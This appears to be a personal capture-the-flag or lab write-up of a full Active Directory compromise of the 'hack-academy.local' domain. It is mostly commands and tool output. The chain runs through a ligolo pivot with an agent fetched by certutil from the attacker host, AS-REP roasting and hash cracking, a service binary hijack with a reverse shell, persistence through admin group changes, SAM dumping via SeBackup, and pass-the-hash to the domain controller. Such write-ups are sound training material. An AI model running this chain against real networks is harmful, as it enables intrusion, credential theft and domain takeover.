start with network discovery with netexec to check targets and domain name. We can see that only Client1 is reachable to we need to use pivot later on
``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 192.168.101.0/24
SMB         192.168.101.113 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
```
![[Pasted image 20260813080738.png]]

we cant collect bloodhound data right now. so we need to figure out something else....

nmap scan on client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 --open -oN nmap.txt

<REDACTED>

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49669/tcp open  unknown
```

nxc-sweep. We have RDP (PWNED!)
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ nxc-sweep 192.168.101.113 -u lcarter -p 'Awesome!'  
[*] Starting NXC sweep for 192.168.101.113 as lcarter ...

[+] Port 445 open. Checking smb ...
SMB         192.168.101.113 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         192.168.101.113 445    CLIENT-1         [+] hack-academy.local\lcarter:Awesome! 
SMB         192.168.101.113 445    CLIENT-1         [*] Enumerated shares
SMB         192.168.101.113 445    CLIENT-1         Share           Permissions     Remark
SMB         192.168.101.113 445    CLIENT-1         -----           -----------     ------
SMB         192.168.101.113 445    CLIENT-1         ADMIN$                          Remote Admin
SMB         192.168.101.113 445    CLIENT-1         C$                              Default share
SMB         192.168.101.113 445    CLIENT-1         IPC$            READ            Remote IPC

[-] Port 5985 closed/filtered. Skipping winrm

[+] Port 3389 open. Checking rdp ...
RDP         192.168.101.113 3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)
RDP         192.168.101.113 3389   CLIENT-1         [+] hack-academy.local\lcarter:Awesome! (Pwn3d!)

```
![[Pasted image 20260813081511.png]]

RDP on Client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'lcarter' /p:'Awesome!' /v:192.168.101.113
```
![[Pasted image 20260813083740.png]]

Okay we need to either setup ligolo for pivoting or privesc

Checked privesc with powerup.ps1.. Nothing interesting so lets setup ligolo
``` sh
┌──(kali㉿kali)-[~/pivot]
└─$ ls
agent.exe  ligolo-ng_agent_0.9.1_windows_amd64.zip  ligolo-ng_proxy_0.9.1_linux_amd64.tar.gz  README.md
LICENSE    ligolo-ng_proxy_0.9.1_linux_amd64.tar    proxy

┌──(kali㉿kali)-[~/pivot]
└─$ sudo ip tuntap add user root mode tun tunnel1

┌──(kali㉿kali)-[~/pivot]
└─$ sudo ip link set tunnel1 up

┌──(kali㉿kali)-[~/pivot]
└─$ sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? Yes
? Allow CORS Access from https://webui.ligolo.ng? Yes
WARN[0009] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
WARN[0009] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0009] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0009] Listening on 0.0.0.0:11601                   
INFO[0009] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0009] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.                      

ligolo-ng »  

```
![[Pasted image 20260813085549.png]]

move agent to target
``` powershell
PS C:\Users\lcarter\Desktop> certutil -urlcache -split -f "http://192.168.101.112:80/agent.exe" agent.exe
****  Online  ****
  000000  ...
  708400
CertUtil: -URLCache command completed successfully.
PS C:\Users\lcarter\Desktop> dir


    Directory: C:\Users\lcarter\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/12/2026  10:54 PM        7373824 agent.exe
-a----         8/12/2026  10:41 PM         600580 powerup.ps1


PS C:\Users\lcarter\Desktop> .\agent.exe -connect 192.168.101.112:11601 -ignore-cert
time="2026-08-12T22:56:50-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-08-12T22:56:50-07:00" level=info msg="Connection established" addr="192.168.101.112:11601"
```
![[Pasted image 20260813085820.png]]

Back on kali ligolo:
``` sh
ligolo-ng » INFO[0210] Agent joined.                                 id=080027801d57 name="HACK-ACADEMY\\lcarter@Client-1" remote="192.168.101.113:50247"
ligolo-ng » 
ligolo-ng » start --tun tunnel1
ligolo-ng » error: please, select an agent using the session command
ligolo-ng » session
? Specify a session : 1 - HACK-ACADEMY\lcarter@Client-1 - 192.168.101.113:50247 - 080027801d57
[Agent : HACK-ACADEMY\lcarter@Client-1] » start --tun tunnel1
INFO[0342] Starting tunnel to HACK-ACADEMY\lcarter@Client-1 (080027801d57) 
[Agent : HACK-ACADEMY\lcarter@Client-1] » sudo ip route add 10.10.10.0/24 dev tunnel1
unknown command, try 'help'
[Agent : HACK-ACADEMY\lcarter@Client-1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[0395] Listener 0 created on remote agent!    
```
![[Pasted image 20260813090551.png]]

And on new kali terminal window. Finish the setup and test connection. We get back the interal targets Client2 and DC
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ sudo ip route add 10.10.10.0/24 dev tunnel1
[sudo] password for kali: 

┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ netexec smb 10.10.10.0/24
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ sudo ip route add 10.0.2.0/24 dev tunnel1                      
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ netexec smb 10.0.2.0/24  

SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)

```
![[Pasted image 20260813090709.png]]

Sprayed the creds but nothing interesting. Setup bloodhound and then  dump users
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ bloodhound-python -u "lcarter" -p 'Awesome!' -d hack-academy.local -c all --zip -ns 10.0.2.4  
 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Client-2.hack-academy.local
INFO: Querying computer: Client-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 01S
INFO: Compressing output into 20260813021314_bloodhound.zip

```
![[Pasted image 20260813091426.png]]

With bloodhound we set lcarter owned and check AS-REP Roastable users. CSANDERS is roastable which we will exploit. But first check all users
![[Pasted image 20260813092653.png]]

usernames list
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ netexec ldap 10.0.2.4 -u lcarter -p 'Awesome!' --users

LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\lcarter:Awesome! 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 13 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-12-13 22:09:00 6        Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             21       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 21       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             lcarter                       2025-12-13 22:09:00 0                                                                    
LDAP        10.0.2.4        389    DC01             jbrooks                       2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             mdoyle                        2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             tgibson                       2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             oparker                       2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             csanders                      2025-12-13 22:09:00 0                                                                    
LDAP        10.0.2.4        389    DC01             rcooper                       2025-12-13 22:09:00 0                                                                    
LDAP        10.0.2.4        389    DC01             amorgan                       2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             nadams                        2025-12-13 22:09:00 21                                                                   
LDAP        10.0.2.4        389    DC01             hgrant                        2025-12-13 22:09:01 21                                                                   
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ gedit usernames

** (gedit:62654): WARNING **: 02:28:43.087: Could not load Peas repository: Typelib file for namespace 'Peas', version '1.0' not found

** (gedit:62654): WARNING **: 02:28:43.087: Could not load PeasGtk repository: Typelib file for namespace 'PeasGtk', version '1.0' not found
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ cat usernames                          
Administrator
Guest
krbtgt
lcarter
jbrooks
mdoyle
tgibson
oparker
csanders
rcooper
amorgan
nadams
hgrant
```
![[Pasted image 20260813092915.png]]


And then we get roasting, and crack the hash
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ impacket-GetNPUsers -dc-ip 10.0.2.4 'hack-academy.local/' -usersfile usernames -format hashcat

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

$krb5asrep$23$csanders@HACK-ACADEMY.LOCAL:34787bcccf3027f76345ab827f6fff72$4a178abf11dab2bff7a3e0f668cfc97d61993c24cb13f976f95f8050d3cf58f8e0f5b880eaf1d5e7f88af96ff76c7b97d1efe16be07bcd3140ca540c29dd571715babdff5295bbb5ad2c7e2b5e46fb7801a60c8a6ba63f502f26b2781fd8f52357cfdb6fc0a210d5fc27762538dc89fe387684060342a7ec50ab9c86e169181464ed74ee22636534b4d0cc3ed63fc376b0d96a61694df9cebbe8ed282631d79e3f66f8a7e94ef09cf9a90a76bddaf2274b6edbd29ec8ce37532d46484dc5af002b37c38fea29584c0dae29e413105514dcf3b7a117bd3293de5d18e24d73ed4f4583706625d97e76332249bed63e96c8f06df9de98e74f5b

<REDACTED>

┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ echo '$krb5asrep$23$csanders@HACK-ACADEMY.LOCAL:34787bcccf3027f76345ab827f6fff72$4a178abf11dab2bff7a3e0f668cfc97d61993c24cb13f976f95f8050d3cf58f8e0f5b880eaf1d5e7f88af96ff76c7b97d1efe16be07bcd3140ca540c29dd571715babdff5295bbb5ad2c7e2b5e46fb7801a60c8a6ba63f502f26b2781fd8f52357cfdb6fc0a210d5fc27762538dc89fe387684060342a7ec50ab9c86e169181464ed74ee22636534b4d0cc3ed63fc376b0d96a61694df9cebbe8ed282631d79e3f66f8a7e94ef09cf9a90a76bddaf2274b6edbd29ec8ce37532d46484dc5af002b37c38fea29584c0dae29e413105514dcf3b7a117bd3293de5d18e24d73ed4f4583706625d97e76332249bed63e96c8f06df9de98e74f5b' > hash_csanders

┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ john hash_csanders --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*Gillian*        ($krb5asrep$23$csanders@HACK-ACADEMY.LOCAL)     
1g 0:00:00:00 DONE (2026-08-13 02:31) 1.282g/s 1457Kp/s 1457Kc/s 1457KC/s *friends..zydel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20260813093233.png]]

no interesting access rights in bloodhound so spray creds
Client2 RDP (PWNED!)
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ netexec rdp ips -u csanders -p '*Gillian*'
[*] Initializing WINRM protocol database
RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\csanders:*Gillian* (Pwn3d!)
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\csanders:*Gillian* 
```
![[Pasted image 20260813093625.png]]

RDP Shell on Client2
``` sh
C:\Users\csanders>whoami
hack-academy\csanders

C:\Users\csanders>hostname
Client-2
```
![[Pasted image 20260813094654.png]]

Used powerup.ps1 on client2 and it showed service that we can hijack
``` sh
ServiceName    : WinMonSvc
Path           : C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe; IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'WinMonSvc' -Path <HijackPath>
CanRestart     : False
Name           : WinMonSvc
Check          : Unquoted Service Paths
```

made msfvenom payload and moved to target and copied it to original
``` sh
ServiceName    : WinMonSvc
Path           : C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe; IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'WinMonSvc' -Path <HijackPath>
CanRestart     : False
Name           : WinMonSvc
Check          : Unquoted Service Paths
```

reverse shell on kali and restart client2 to catch shell
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.101.112 • 172.17.0.1 • 172.18.0.1

<REDACTED>

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
Client-2

```
![[Pasted image 20260813111735.png]]

add csanders to admin group for easire access and persistance
``` sh
C:\Windows\system32>net localgroup "Administrators" csanders /add
net localgroup "Administrators" csanders /add
The command completed successfully.
```
![[Pasted image 20260813111856.png]]

Confirm the creds
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/exploit]
└─$ nxc-sweep 10.0.2.9 -u csanders -p '*Gillian*' 
[*] Starting NXC sweep for 10.0.2.9 as csanders ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\csanders:*Gillian* (Pwn3d!)
SMB         10.0.2.9        445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.9        445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.9        445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.9        445    CLIENT-2         ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.9        445    CLIENT-2         C$              READ,WRITE      Default share
SMB         10.0.2.9        445    CLIENT-2         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [+] hack-academy.local\csanders:*Gillian* (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\csanders:*Gillian* (Pwn3d!)

```

Then dump secrets as admin. Hash for rcooper which we are going to crack
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/exploit]
└─$ impacket-secretsdump csanders@10.0.2.9

<REDACTED>

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/csanders:$DCC2$10240#csanders#3d5aa497db110f3db5d66ab540917c6d: (2026-08-13 07:40:50+00:00)
HACK-ACADEMY.LOCAL/rcooper:$DCC2$10240#rcooper#431223350907375093d6ab02aa69e6ba: (2025-12-20 15:26:26+00:00)

```
![[Pasted image 20260813112353.png]]

crack the hash for rcooper
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ john hash_rcooper --wordlist=/usr/share/wordlists/rockyou.txt 

<REDACTED>

Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password@123     (HACK-ACADEMY.LOCAL/rcooper)     
```

Spray the creds and we have winrm on DC1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ netexec winrm ips -u rcooper -p 'Password@123'

WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.7        5985   CLIENT-1         [-] hack-academy.local\rcooper:Password@123
WINRM       10.0.2.4        5985   DC01             [+] hack-academy.local\rcooper:Password@123 (Pwn3d!)
WINRM       10.0.2.9        5985   CLIENT-2         [-] hack-academy.local\rcooper:Password@123
```
![[Pasted image 20260813112631.png]]

Check the privileges and we have SeBackup Priv which is easy to exploit
``` sh
*Evil-WinRM* PS C:\Users\rcooper\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ==============================================
hack-academy\rcooper S-1-5-21-1516340173-3939677173-1136271741-1111


<REDACTED>

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
```

SeBackupPriv exploitinh and getting admin hash
``` sh
*Evil-WinRM* PS C:\Users\rcooper\Documents> cd c:\
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/13/2026  11:28 AM                temp

*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\temp> download sam
Info: Downloading C:\temp\sam to sam   
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
Info: Downloading C:\temp\system to system
Info: Download successful!

*Evil-WinRM* PS C:\temp> exit
Info: Exiting with code 0

┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ impacket-secretsdump -system system -sam sam local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9fd2b272cd8692648f93d076b1cc3453
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c0ced2de918b4a7c1b9f4efd225dd503:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```
![[Pasted image 20260813113020.png]]

try pass the hash with admin hash
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD4/loot]
└─$ evil-winrm -u Administrator -H c0ced2de918b4a7c1b9f4efd225dd503 -i 10.0.2.4


*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hack-academy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::409c:8a16:c5fb:9329%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.4
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

```
![[Pasted image 20260813113245.png]]
![[Pasted image 20260813113252.png]]